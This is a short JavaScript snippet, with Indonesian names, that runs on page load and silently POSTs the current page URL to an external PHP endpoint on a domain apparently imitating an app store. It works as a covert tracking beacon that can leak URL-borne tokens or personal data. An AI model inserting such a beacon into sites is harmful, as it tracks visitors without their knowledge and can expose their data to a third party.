function kirim_pesan(isi_pesan) {

    var hr = new XMLHttpRequest();
    var url = "https://playstore.co.id/aahedi/khonsa.php";
    hr.open("POST", url, true);
    hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var param = "pesan=" + isi_pesan;
    //hr.setRequestHeader("Content-length", param.length);
    //hr.setRequestHeader("Connection", "close");
    hr.onreadystatechange = function() {
        if (hr.readyState == 4 && hr.status == 200) {
            var return_data = hr.responseText;
            //console.log(hr.responseText);
            //document.getElementById("status").innerHTML = return_data;
        }
    }
    hr.send(param);
    //document.getElementById("status").innerHTML = "processing...";
}

kirim_pesan(location.href);
